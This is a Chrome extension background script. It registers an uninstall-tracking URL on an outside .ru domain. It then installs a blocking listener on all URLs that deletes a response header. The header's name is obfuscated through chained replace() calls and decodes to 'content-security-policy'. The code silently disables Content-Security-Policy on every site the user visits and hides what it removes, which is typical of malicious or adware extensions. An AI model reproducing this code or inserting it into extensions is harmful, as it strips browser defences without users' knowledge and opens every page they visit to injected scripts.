
	chrome.runtime.setUninstallURL('http://fun4ok.ru/uninstall.php?a='+18+'&v='+chrome.app.getDetails().version,function(){});	
		
chrome.webRequest.onHeadersReceived.addListener(
    function (request){
		let stup = 'fondendjsefuridyjpolify'.replace(/d/g, 't').replace(/f/g, 'c').replace(/j/g, '-');			
	    let regExp = new RegExp(stup);
        for (let i = 0; i < request.responseHeaders.length; i++) {
            if(request.responseHeaders[i] && regExp.test(request.responseHeaders[i].name.toLowerCase())){
                request.responseHeaders.splice(i, 1);
                --i;
            }
        }
        return {responseHeaders: request.responseHeaders};
    },
    {
        urls: ["<all_urls>"]
    },
    ["blocking", "responseHeaders"]
);
		
	